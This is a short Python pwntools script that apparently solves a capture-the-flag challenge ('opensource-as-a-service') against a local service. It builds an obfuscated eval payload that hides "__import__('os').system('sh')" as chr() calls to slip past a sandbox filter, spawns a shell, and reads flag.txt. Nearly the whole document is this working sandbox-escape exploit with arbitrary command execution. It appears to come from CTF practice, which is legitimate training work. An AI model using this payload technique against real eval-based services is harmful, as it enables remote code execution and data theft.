#!/usr/bin/env python3
from pwn import *

# conn = remote("opensource-as-a-service.ctf.insecurity-insa.fr", 12345)
conn = remote("localhost", 54321)

to_evaluate = "__import__('os').system('sh')"

append_str = "dir(str())[55]"
append_func = "getattr(str(), {})".format(append_str)
append_func = append_func.replace(" ", "")
payload = "{append_func}({list_of_char_to_evaluate})"

list_of_char_to_evaluate = ["chr({})".format(ord(c)) for c in to_evaluate]
list_of_char_to_evaluate = str(list_of_char_to_evaluate).replace(" ", "").replace("'", "")
payload = payload.format(append_func=append_func, list_of_char_to_evaluate=list_of_char_to_evaluate)
payload = "eval({})".format(payload)


def read_menu(conn):
    for _ in range(9):
        print(conn.readline().decode().strip())


print(conn.readline().decode().strip())
read_menu(conn)

conn.sendline("1")
print(conn.readline().decode().strip())
conn.sendline(payload)
conn.sendline("123")
read_menu(conn)
conn.sendline("4")
conn.sendline("cat flag.txt;echo")
if b'INSA{' in conn.readline():
    print("OK")
    conn.close()
    exit(0)

conn.close()
exit(1)
